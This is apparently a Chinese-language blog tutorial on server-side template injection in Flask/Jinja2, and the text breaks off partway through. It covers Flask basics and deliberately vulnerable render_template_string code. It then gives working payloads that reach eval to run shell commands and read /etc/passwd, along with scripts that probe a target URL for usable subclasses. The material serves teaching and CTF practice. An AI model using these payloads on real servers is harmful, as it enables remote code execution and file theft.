<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="2js56,2js56666@gmail.com"><title>SSTI通天指北 · 2js56's blog</title><meta name="description" content="SSTI通天指北Python Flask变量及方法我们这里使用python的venv环境来进行学习测试

创建虚拟环境：可以使用venv模块的venv函数来创建一个新的虚拟环境。例如，使用以下命令创建一个名为”myenv”的虚拟环境1python -m venv flask2
激活虚拟环境：在创建虚"><meta name="keywords" content="Hexo,HTML,CSS,web,Linux"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">2js56's blog</a></h3><div class="description"><p>love 林海青</p></div></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="http://github.com/2js56"><i class="fa fa-github"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">Home</a></li><li><a href="/about">Sobre</a></li><li><a href="/archives">Archivo</a></li><li><a href="/links">Enlaces</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/touxiang.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>SSTI通天指北</a></h3></div><div class="post-content"><h1 id="SSTI通天指北"><a href="#SSTI通天指北" class="headerlink" title="SSTI通天指北"></a>SSTI通天指北</h1><h2 id="Python-Flask变量及方法"><a href="#Python-Flask变量及方法" class="headerlink" title="Python Flask变量及方法"></a>Python Flask变量及方法</h2><p>我们这里使用python的venv环境来进行学习测试</p>
<ol>
<li>创建虚拟环境：可以使用venv模块的venv函数来创建一个新的虚拟环境。例如，使用以下命令创建一个名为”myenv”的虚拟环境<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m venv flask2</span><br></pre></td></tr></table></figure></li>
<li>激活虚拟环境：在创建虚拟环境后，可以激活它以开始使用。激活虚拟环境将更改当前命令行会话中Python解释器和安装包的路径。根据操作系统的不同，激活命令也不同：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在Windows上：执行flask2\Scripts\activate.bat</span><br><span class="line">在Linux/macOS上：执行source flask2/bin/activate</span><br></pre></td></tr></table></figure></li>
<li>退出虚拟环境：当不再需要虚拟环境时，可以使用以下命令退出虚拟环境：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hello&#x27;)</span><br><span class="line">def hello():</span><br><span class="line">	return &quot;hello benben&quot;</span><br><span class="line">if __name__==&#x27;__main__ &#x27;:</span><br><span class="line">	app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>通过向规则参数添加变量部分，可以动态构建URL  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hello/&lt;name&gt;&#x27;)</span><br><span class="line">def hello(name):</span><br><span class="line">	return &quot;hello %s&quot; % name</span><br><span class="line">@app.route(&#x27;/int/&lt;int:postID&gt;&#x27;)</span><br><span class="line">def id(postID):</span><br><span class="line">	return &quot; %d &quot; % postID</span><br><span class="line">@app.route(&#x27;/rev/&lt;float:revNo&gt;&#x27;)</span><br><span class="line">def id(revNo):</span><br><span class="line">	return &quot;Revision Number %f &quot; % revNo</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">	app.run(debug=True)</span><br></pre></td></tr></table></figure>
<p>其中<code>&lt;name&gt;</code>变量获取到值后就会传参给hello(name)<br><code>127.0.0.1:5000/hello/动态变量</code><br>%s 格式化字符串  %d 整数 %f 浮点值  </p>
<h2 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h2><p>Http协议是万维网中数据通信的基础。在该协议中定义了从指定URL检索数据的不同方法。<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230925222433.png"><br>在demo.py的同级目录下创建一个templates文件夹，里面放入一个index.html，其内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://localhost:5000/login&quot; method=&quot;post&quot;&gt;</span><br><span class="line">		&lt;p&gt;Enter Name:&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>而demo.py则为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,redirect,url_for,request,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">	return render_template(&quot;index.html&quot;)</span><br><span class="line">@app.route(&#x27;/success/&lt;name&gt;&#x27;)</span><br><span class="line">def success(name):</span><br><span class="line">	return &#x27;welcome %s&#x27; % name</span><br><span class="line">@app.route(&#x27;/login&#x27;,methods = [&#x27;POST&#x27;,&#x27;GET&#x27;])</span><br><span class="line">def login():</span><br><span class="line">	if request.method == &#x27;POST&#x27;:</span><br><span class="line">		print(1)</span><br><span class="line">		user = request.form[&#x27;user&#x27;]</span><br><span class="line">		return redirect(url_for(&#x27;success&#x27;,name = user))</span><br><span class="line">	else:</span><br><span class="line">		print(2)</span><br><span class="line">		user = request.args.get(&#x27;user&#x27;)</span><br><span class="line">		return redirect(url_for(&#x27;success&#x27;,name = user))</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">	app.run(debug=True)</span><br></pre></td></tr></table></figure>
<p>可以POST提交也可以GET提交，用redirect重定向&#x2F;success&#x2F;user<br>POST提交用户名：127.0.0.1:5000<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926152228.png"><br>GET提交用户名：127.0.0.1:5000&#x2F;login?user&#x3D;lhq  </p>
<h2 id="flask模板介绍"><a href="#flask模板介绍" class="headerlink" title="flask模板介绍"></a>flask模板介绍</h2><p>视图函数的主要作用是生成请求的响应，需要处理业务逻辑和返回响应内容<br>把业务逻辑和表现内容放在一起，会增加代码的复杂度和维护成本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def hello():</span><br><span class="line">	return &quot;hello benben&quot;</span><br><span class="line"></span><br><span class="line">def index():</span><br><span class="line">	return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">def success(name):</span><br><span class="line">	return &#x27;welcome %s&#x27; % name</span><br></pre></td></tr></table></figure>
<p><strong>使用模板：</strong>使用静态的页面html展示动态的内容<br>模板是一个响应文本的文件，其中占用符(变量)表示动态部分，告诉模板引擎其具体的值需要从使用的数据中获取。<br>使用真实值替换变量，再返回最终得到的字符串，这个过程称为”渲染”。<br>Flask使用Jinja2这个模板引擎来渲染模板。<br>这样视图函数只负责业务逻辑和数据处理，而模板取到视图函数的数据结果来进行展示<br>这样可以让代码结构清晰，耦合度低<br><strong>render_template:</strong><br>加载html文件。默认文件路径在templates目录下，在templates目录下创建index.html文件  </p>
<p><strong>demo.py:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,render_template,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods = [&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">	my_str = request.args.get(&#x27;lhq&#x27;)</span><br><span class="line">	my_int = 12</span><br><span class="line">	my_array = [5,2,0,1,3,1,4]</span><br><span class="line">	my_dict = &#123;</span><br><span class="line">		&#x27;name&#x27;:&#x27;2js56&#x27;,</span><br><span class="line">		&#x27;age&#x27;:20</span><br><span class="line">	&#125;</span><br><span class="line"># 往模板中传入数据，字符串，列表，字典</span><br><span class="line">	return render_template(&#x27;index.html&#x27;,my_str=my_str,my_int=my_int,my_array=my_array,my_dict=my_dict)</span><br><span class="line"># render_template方法：渲染模板 参数1：模板名称index.html 参数2：传到模板里的数据</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">	app.run(debug=True)</span><br></pre></td></tr></table></figure>
<p><strong>index.html:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charest=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">模板展示页面</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;&#123;my_str&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;&#123;my_int&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;% set a=&#x27;dazhuang&#x27;%&#125;</span><br><span class="line">&#123;&#123;a&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;&#123;my_array&#125;&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;&#123;my_dict&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926160621.png"><br><strong>render_template_string</strong><br>用于渲染字符串，直接定义内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,render_template,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods = [&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">	my_str = request.args.get(&#x27;lhq&#x27;)</span><br><span class="line">	my_int = 12</span><br><span class="line">	my_array = [5,2,0,1,3,1,4]</span><br><span class="line">	my_dict = &#123;</span><br><span class="line">		&#x27;name&#x27;:&#x27;2js56&#x27;,</span><br><span class="line">		&#x27;age&#x27;:20</span><br><span class="line">	&#125;</span><br><span class="line">	return render_template_string(&#x27;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;模板html展示页面&lt;br&gt;%s&lt;/body&gt;&lt;/html&gt;&#x27; % my_str)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">	app.run(debug=True)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926161234.png">  </p>
<h2 id="模板注入漏洞介绍"><a href="#模板注入漏洞介绍" class="headerlink" title="模板注入漏洞介绍"></a>模板注入漏洞介绍</h2><p>flask代码不严谨导致SSTI，可能造成任意文件读取和RCE远程控制后台系统<br>漏洞成因：渲染模板时，没有严格控制对用户的输入；<br>flask是基于python开发的一种web服务器，那么也就意味着如果用户可以和flask进行交互的话，就可以执行python的代码，比如eval,system,file等等等等之类的函数。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods = [&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">	str = request.args.get(&#x27;lhq&#x27;)</span><br><span class="line">	html_str = &#x27;&#x27;&#x27;</span><br><span class="line">	&lt;html&gt;</span><br><span class="line">	&lt;head&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;&#123;&#123;sttr&#125;&#125;&lt;/body&gt;</span><br><span class="line">	&lt;/html&gt;</span><br><span class="line">	&#x27;&#x27;&#x27;</span><br><span class="line">	return render_template_string(html_str,sttr=str)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">	app.debug = True</span><br><span class="line">	app.run(&#x27;127.0.0.1&#x27;,&#x27;8080&#x27;)</span><br></pre></td></tr></table></figure>
<p>GET方式获取lhq的值，赋值给str<br>str值通过<code>render_template_string</code>加载到body中间<br>str是被<code>&#123;&#123;&#125;&#125;</code>包裹起来的，会被预先渲染转义，然后才输出，不会被渲染执行；  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from importlib.resources import contents</span><br><span class="line">from flask import Flask,request,render_template_string</span><br><span class="line">import time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods = [&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">	str = request.args.get(&#x27;lhq&#x27;)</span><br><span class="line">	html_str = &#x27;&#x27;&#x27;</span><br><span class="line">	&lt;html&gt;</span><br><span class="line">	&lt;head&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;&#123;0&#125;&lt;/body&gt;</span><br><span class="line">	&lt;/html&gt;</span><br><span class="line">	&#x27;&#x27;&#x27;.format(str)</span><br><span class="line">	return render_template_string(html_str)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">	app.debug = True</span><br><span class="line">	app.run(&#x27;127.0.0.1&#x27;,&#x27;8080&#x27;)</span><br></pre></td></tr></table></figure>
<p>str值通过format()函数填充到body中间<br>{}里可以定义任何参数<br><code>return render_template_string</code>会把{}内的字符串当成代码指令<br>此时输入url:<code>http://127.0.0.1:8080/?lhq=&#123;&#123;7*7&#125;&#125;</code>，<code>&#123;&#123;7*7&#125;&#125;</code>会被当成指令执行，回显为49<br><code>http://127.0.0.1:8080/?lhq=&#123;&#123;%27%27.__class__.__mro__&#125;&#125;</code>被当成指令来执行<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926170330.png"><br><strong>SSTI</strong><br>服务器端模板注入(Server-Side Template Injection),实际上也是一个注入漏洞。<br>判断SSTI类型：<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926170717.png">  </p>
<h2 id="python继承关系和魔术方法"><a href="#python继承关系和魔术方法" class="headerlink" title="python继承关系和魔术方法"></a>python继承关系和魔术方法</h2><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><p>父类和子类<br>子类 调用父类下的其他子类<br>Python flask脚本没办法直接执行python指令  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classA-&gt;object-&gt;classB-&gt;Eval函数</span><br><span class="line">子类   -&gt; 父类  -&gt;  子类</span><br></pre></td></tr></table></figure>

<p>object是父子关系的顶端，所有的数据类型最终的父类都是object  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class A:pass</span><br><span class="line">class B(A):pass</span><br><span class="line">class C(B):pass</span><br><span class="line">class D(B):pass</span><br><span class="line">c = C()</span><br><span class="line"># 子类(父类)</span><br><span class="line">print(c.__class__)</span><br><span class="line">print(c.__class__.__base__)</span><br><span class="line">print(c.__class__.__base__.__base__)</span><br><span class="line">print(c.__class__.__base__.__base__.__base__)</span><br><span class="line">print(c.__class__.__mro__)</span><br><span class="line">print(c.__class__.__mro__[1].__subclasses__())</span><br><span class="line">print(c.__class__.__mro__[1].__subclasses__()[1])</span><br></pre></td></tr></table></figure>
<p><code>print(c.__class__)</code>的运行结果是<code>&lt;class &#39;__main__.C&#39;&gt;</code> 输出当前类C<br><code>print(c.__class__.__base__)</code>的运行结果是<code>&lt;class &#39;__main__.B&#39;&gt;</code>，输出类C的父类B<br><code>print(c.__class__.__base__.__base__)</code>的运行结果是<code>&lt;class &#39;__main__.A&#39;&gt;</code>，输出类C的父类的父类A<br><code>print(c.__class__.__base__.__base__.__base__)</code>的运行结果是<code>&lt;class &#39;object&#39;&gt;</code>，此为最终的父类<br><code>print(c.__class__.__mro__)</code>的运行结果是<code>(&lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;object&#39;&gt;)</code>，即罗列当前类及其所有父类<br><code>print(c.__class__.__mro__[1].__subclasses__())</code>的结果为<code>[&lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.D&#39;&gt;]</code>，输出类C的mro中的第2个父类B的所有子类<br><code>print(c.__class__.__mro__[1].__subclasses__()[1])</code>的结果为<code>&lt;class &#39;__main__.D&#39;&gt;</code>在，调用类B的第2个子类D   </p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__class__# 查找当前类型的所属对象</span><br><span class="line">__base__# 沿着父子类的关系往上走一个</span><br><span class="line">__mro__# 查找当前类对象的所有继承类</span><br><span class="line">__subclasses__()# 查找父类下的所有子类</span><br><span class="line">__init__# 查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载  </span><br><span class="line">__globals__# 函数会以字典的形式返回当前对象的全部全局变量</span><br></pre></td></tr></table></figure>
<p><strong>常用注入模块：</strong><br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926213639.png"><br><strong>ssti测试用例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/ssti&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def sb():</span><br><span class="line">    template = &#x27;&#x27;&#x27;</span><br><span class="line">        &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="line">            &lt;h1&gt;This is ssti! %s&lt;/h1&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &#x27;&#x27;&#x27; % request.args[&quot;x&quot;]</span><br><span class="line"></span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>最常用的一个模块是：<code>os._wrap_close</code><br>传入参数：<code>?x=&#123;&#123;''.__class__.__base__.__subclasses__()&#125;`,将结果复制到编辑器，把逗号`,`替换为`\n`,则可通过行号知道我们需要的模块的编号    
![](https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926215023.png)  
在第145行  
于是`?x=&#123;&#123;''.__class__.__base__.__subclasses__()[144]&#125;&#125;</code>得到我们想要的<code>os._wrap_close</code><br>再加上<code>.__init__</code>，没有出现wrapper字眼，说明已经重载，再加上<code>.__globals__</code>，查看全部全局变量，有哪些可以使用的方法函数等<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926215902.png"><br>构造payload：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[144].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><code>__builtins__</code>提供对Python的所有”内置”标识符的直接访问<br><code>eval()</code>计算字符串表达式的值<br><code>__import__</code>加载os模块<br><code>popen()</code>执行一个shell以运行命令来开启一个进程</p>
<h2 id="SSTI常用注入模块"><a href="#SSTI常用注入模块" class="headerlink" title="SSTI常用注入模块"></a>SSTI常用注入模块</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>查找子类:<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code><br><strong>POST</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    data = &#123;&quot;x&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;_frozen_importlib_external.FileLoader&#x27; in response.text:</span><br><span class="line">                print(i)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<p><strong>GET</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    param = &#123;&quot;x&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url, params=param)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;_frozen_importlib_external.FileLoader&#x27; in response.text:</span><br><span class="line">                print(i)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
<p>其中的参数<code>x</code>根据题目变化而变化，而<code>_frozen_importlib_external.FileLoader</code>则替换为自己想要查找的模块名字<br><img src="https://cdn.jsdelivr.net/gh/2js56/PictureBed@master/images/20230926225621.png"><br><strong>FileLoader的利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)</span><br></pre></td></tr></table></figure>
<p>调用<code>get_data</code>方法，传入参数0和文件路径<br><code>&#123;&#123;config&#125;&#125;</code>通过这个查看配置文件里面有没有flag</p>
<h3 id="内建函数eval执行命令"><a href="#内建函数eval执行命令" class="headerlink" title="内建函数eval执行命令"></a>内建函数eval执行命令</h3><p>内建函数: python在执行脚本时自动加载的函数<br>python脚本查看可利用内建函数eval的模块<br><strong>GET</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = input(&quot;Enter the url: &quot;)</span><br><span class="line">for i in range(500):</span><br><span class="line">    param = &#123;&quot;x&quot;: &quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url, params=param)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if 